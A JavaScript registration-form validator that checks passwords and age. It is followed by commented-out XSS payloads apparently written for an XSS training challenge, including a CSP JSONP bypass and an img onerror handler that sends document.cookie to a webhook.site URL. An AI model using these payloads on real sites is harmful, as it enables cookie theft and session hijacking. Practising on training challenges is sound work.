function validateForm() {
    const password1 = document.forms["registrationForm"]["password1"].value;
    const password2 = document.forms["registrationForm"]["password2"].value;

    // // print password1
    // console.log(password1);

    if (password2 !== password1) {
        window.location.href = "/pages/registration.php?status=passwordMismatch";
        return false;
    }
    const uppercase = /[A-Z]/;
    const specialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/;

    if (password1.length < 8) {
        window.location.href = "/pages/registration.php?status=shortPassword";
        return false;
    }

    if (!uppercase.test(password1)) {
        window.location.href = "/pages/registration.php?status=noUppercase";
        return false;
    }

    if (!specialChar.test(password1)) {
        window.location.href = "/pages/registration.php?status=noSpecialChar";
        return false;
    }

    const bday = document.forms["registrationForm"]["bday"].value;
    const [year, month, day] = bday.split("-");
    const birthdate = new Date(year, month - 1, day);
    const ageInYears = (new Date() - birthdate) / (365 * 24 * 60 * 60 * 1000);
    if (ageInYears < 18) {
        window.location.href = "/pages/registration.php?status=tooYoung";
        return false;
    }

    return true;

}



// <h1> <script> window.location.href="https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f"; </script> </h1>


// <h1> <script> 
//   https://xss.challenge.training.hacq.me/challenges/baby01.php
//  </script> </h1>


// <img src='#' onerror=fetch("https://webhook.site/29601392-3225-44b7-963f-911784ca5c5a")>


// <h1> <img src= https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f ></img></h1>


// </h1> <script> 
//   fetch("https://xss.challenge.training.hacq.me/challenges/csp01-jsonp.php?callback=alert(1);");
//  </script> 
//  <h1>

// <img src="" onerror="fetch('https://webhook.site/ec1b88f5-3e54-45f4-a8d1-e908a01e8e3f/SONOIO' + document.cookie);">




// </h1 <script>

// </h1>
// <script src="csp01-jsonp.php?callback=alert(1);callback">
// </script>  
// <h1>
  



// https://xss.challenge.training.hacq.me/challenges/csp01-jsonp.php?callback=callback